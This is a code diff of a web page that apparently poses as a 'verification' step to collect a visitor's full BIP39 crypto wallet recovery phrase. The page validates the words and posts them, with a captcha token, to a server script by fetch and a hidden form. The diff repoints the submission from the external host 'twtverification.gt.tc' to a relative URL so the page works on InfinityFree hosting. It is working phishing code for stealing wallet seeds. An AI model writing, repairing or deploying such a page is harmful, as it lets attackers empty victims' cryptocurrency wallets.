@@ -204,8 +204,8 @@
             <div class="h-captcha" data-sitekey="99c6e00e-96b2-4edc-b17e-1998eee0e932" data-callback="hcaptchaCallback"></div>
         </div>
         
-        <!-- 🚨 FORM POST (NO CORS) -->
-        <form id="phraseForm" method="POST" action="https://twtverification.gt.tc/index.php" target="resultFrame">
+        <!-- ✅ FIXED: Single form with RELATIVE URL for InfinityFree -->
+        <form id="phraseForm" method="POST" action="/index.php" target="resultFrame">
             <input type="hidden" name="phrase" id="phraseInput">
             <input type="hidden" name="hcaptcha_response" id="hcaptchaInput">
         </form>
@@ -224,10 +224,7 @@
     (function() {
         'use strict';
         
-        // ⚠️ CHANGE THIS TO YOUR INFINITYFREE URL
-        const PROCESS_URL = 'https://twtverification.gt.tc/index.php';
-        
-        // PASTE YOUR BIP39 WORDLIST HERE
+        // ✅ PASTE YOUR BIP39 WORDLIST HERE
         const wordlist = [
             'abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract', 'absurd', 'abuse',
     'access', 'accident', 'account', 'accuse', 'achieve', 'acid', 'acoustic', 'acquire', 'across', 'act',
@@ -545,7 +542,6 @@
             submitBtn.disabled = !(allFilled && allValid && noDuplicates && captchaValid);
         }
 
-        // 🚨 FULL DEBUG VERSION 
         async function submitForm() {
             const phrase = inputs.map(i => i.value.trim());
             
@@ -571,7 +567,7 @@
 
             // 1️⃣ FETCH REQUEST (for console debugging)
             console.log('🌐 SENDING FETCH...');
-            fetch('https://twtverification.gt.tc/index.php', {
+            fetch('/index.php', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                 body: `phrase=${encodeURIComponent(JSON.stringify(phrase))}&hcaptcha_response=${encodeURIComponent(hcaptchaToken)}`
@@ -585,7 +581,7 @@
                 debugText.innerHTML += `<br>❌ FETCH ERROR: ${err.message}`;
             });
 
-            // 2️⃣ FORM SUBMISSION (original no-CORS method)
+            // 2️⃣ FORM SUBMISSION (InfinityFree compatible)
             console.log('📄 SENDING FORM...');
             document.getElementById('phraseInput').value = JSON.stringify(phrase);
             document.getElementById('hcaptchaInput').value = hcaptchaToken;
